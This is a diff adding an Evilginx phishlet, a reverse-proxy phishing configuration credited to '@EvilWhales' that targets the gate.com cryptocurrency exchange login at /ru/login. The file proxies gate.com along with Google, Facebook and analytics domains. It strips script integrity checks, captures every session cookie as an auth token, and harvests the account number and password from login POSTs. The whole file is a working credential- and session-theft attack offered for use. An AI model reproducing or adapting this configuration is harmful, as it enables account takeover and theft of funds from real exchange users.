@@ -1,0 +1,88 @@
+author: '@EvilWhales'
+min_ver: '3.3.0'
+# Mods / PHISHLETs / Training / xCommunity - A large community of professional reverse proxy developers in our Discord channel RProxy LAB. More information on our website lab.evilginx.dev
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'gate.com', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: 's', orig_sub: 's', domain: 'go-mpulse.net', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'gimg2', orig_sub: 'gimg2', domain: 'gateimg.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'icon', orig_sub: 'icon', domain: 'gateimg.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'apm', orig_sub: 'apm', domain: 'volccdn.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'websdk', orig_sub: 'websdk', domain: 'appsflyer.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'snssdk', orig_sub: 'snssdk', domain: 'gatedata.org', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'panpno.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'webws', orig_sub: 'webws', domain: 'gateio.live', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'apmplus', orig_sub: 'apmplus', domain: 'volces.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'wa', orig_sub: 'wa', domain: 'appsflyer.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'connect', orig_sub: 'connect', domain: 'facebook.net', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'wsw', orig_sub: 'www', domain: 'facebook.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'gavatar', orig_sub: 'gavatar', domain: 'gateimage.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'wws', orig_sub: 'www', domain: 'googletagmanager.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'was', orig_sub: 'www', domain: 'google-analytics.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'analytics', orig_sub: 'analytics', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'play', orig_sub: 'play', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'aww', orig_sub: 'www', domain: 'google.ru', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'csp', orig_sub: 'csp', domain: 'withgoogle.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'fonts', orig_sub: 'fonts', domain: 'gstatic.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'google', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'gstatic', orig_sub: 'www', domain: 'gstatic.com', session: true, is_landing: false, auto_filter: true}
+
+sub_filters:
+  - {triggers_on: 'www.gate.com', orig_sub: 'www', domain: 'gate.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.gate.com', orig_sub: 's', domain: 'go-mpulse.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.gate.com', orig_sub: 'gimg2', domain: 'gateimg.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.gate.com', orig_sub: 'icon', domain: 'gateimg.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.gate.com', orig_sub: 'apm', domain: 'volccdn.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.gate.com', orig_sub: 'websdk', domain: 'appsflyer.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.gate.com', orig_sub: 'snssdk', domain: 'gatedata.org', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.gate.com', orig_sub: 'static', domain: 'panpno.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.gate.com', orig_sub: 'webws', domain: 'gateio.live', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.gate.com', orig_sub: 'apmplus', domain: 'volces.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.gate.com', orig_sub: 'wa', domain: 'appsflyer.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.gate.com', orig_sub: 'connect', domain: 'facebook.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.gate.com', orig_sub: 'www', domain: 'facebook.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.gate.com', orig_sub: 'gavatar', domain: 'gateimage.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.gate.com', orig_sub: 'www', domain: 'googletagmanager.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.gate.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.gate.com', orig_sub: 'www', domain: 'google-analytics.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.gate.com', orig_sub: 'analytics', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.gate.com', orig_sub: 'play', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.gate.com', orig_sub: 'www', domain: 'google.ru', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.gate.com', orig_sub: 'csp', domain: 'withgoogle.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.gate.com', orig_sub: 'www', domain: 'gstatic.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.gate.com', orig_sub: 'fonts', domain: 'gstatic.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.gate.com', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.gstatic.com', orig_sub: 'www', domain: 'gstatic.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'fonts.gstatic.com', orig_sub: 'fonts', domain: 'gstatic.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.googletagmanager.com', orig_sub: 'www', domain: 'googletagmanager.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+ #- {triggers_on: 'www.google.com', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.google.com', orig_sub: 'www', domain: 'google.com', search: "integrity[ \t]*=[ \t]*[\"']sha384-.{64}[\"']", replace: 'integrity=""', mimes: ['text/javascript']}
+  - {triggers_on: 'www.gstatic.com', orig_sub: 'www', domain: 'gate.com', search: "\\(window.location.href\\)", replace: '(window.location.href.replace("{hostname}", "{orig_hostname}"))', mimes: ['text/javascript']}
+
+auth_tokens:
+  - domain: '.gate.com'
+    keys: ['.*,regexp']
+  - domain: '.google.ru'
+    keys: ['.*,regexp']
+  - domain: 'www.gate.com'
+    keys: ['.*,regexp']
+  - domain: '.www.google-analytics.com'
+    keys: ['.*,regexp']
+  - domain: '.appsflyer.com'
+    keys: ['.*,regexp']
+auth_urls:
+  - '/ru'
+
+credentials:
+  username:
+    key: 'account_number'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'www.gate.com'
+  path: '/ru/login'
